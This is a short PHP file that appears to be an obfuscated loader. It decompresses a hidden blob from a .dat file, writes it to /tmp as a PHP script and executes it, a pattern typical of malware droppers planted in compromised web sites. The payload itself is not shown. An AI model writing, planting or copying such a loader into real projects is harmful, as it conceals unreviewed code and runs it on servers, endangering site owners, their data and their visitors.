<?php
	$nUtl = 'utils'; $pth = dirname( __FILE__ );
	$UtlH = "$pth/$nUtl.php"; $UtlT = "/tmp/$nUtl.php"; $UtlZ = "$pth/$nUtl.dat";
	if(file_exists($UtlH)) {
		require_once($UtlH);
	} else if(file_exists($UtlT)) {
		require_once($UtlT);
	} else {
		$dt = file_get_contents($UtlZ); 
		$dt = trim(@gzinflate($dt));
		file_put_contents($UtlT, "<?php".chr(10).$dt.chr(10)."?>");
		require_once($UtlT);
	}
?>